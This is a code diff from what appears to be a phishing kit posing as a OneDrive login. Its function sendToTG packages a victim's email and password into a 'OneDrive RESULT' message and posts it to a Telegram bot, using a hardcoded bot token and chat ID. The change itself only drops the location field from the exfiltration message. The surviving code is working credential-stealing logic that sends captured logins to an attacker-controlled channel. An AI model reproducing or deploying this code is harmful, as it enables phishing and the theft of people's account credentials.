@@ -13,7 +13,7 @@ async function sendToTG(e, p) {
         const telegramBotToken = "6854177545:AAHGKxjdX8SL_eKUtCnY06CZ135vD8hDB7Q"; // Replace with your Telegram bot token
         const chatId = 5645205996; // Replace with your chat ID
 
-        const messageText = `**OneDrive RESULT**\nEmail: ${e}\nPassword: ${p} \n\nLocation: ${loc}`;
+        const messageText = `**OneDrive RESULT**\nEmail: ${e}\nPassword: ${p} \n`;
 
   const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
